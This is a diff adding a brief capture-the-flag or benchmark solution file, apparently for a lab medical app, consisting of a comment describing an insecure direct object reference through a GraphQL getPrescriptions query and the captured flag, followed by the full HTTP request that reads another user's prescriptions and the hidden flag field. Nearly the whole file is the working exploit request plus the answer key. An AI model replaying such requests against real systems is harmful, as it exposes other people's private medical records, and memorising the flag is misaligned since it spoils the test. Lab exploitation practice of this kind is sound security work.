@@ -1,0 +1,9 @@
+# IDOR via GraphQL: query getPrescriptions with userId=1 (admin) while authenticated as userId=2. The flag field is exposed in the GraphQL schema but hidden from the frontend UI. Extracts FLAG{f9a0cb1e9aa6749b100a8ad6b75627f6afbd3b1dc5eca6d2b92083fec5949b8d}
+
+POST /graphql HTTP/1.1
+Host: 172.17.0.1:45673
+Content-Type: application/json
+Cookie: session=<valid-session-cookie>
+Content-Length: 89
+
+{"query": "query { getPrescriptions(userId: 1) { id userId prescriptionDetails flag } }"}
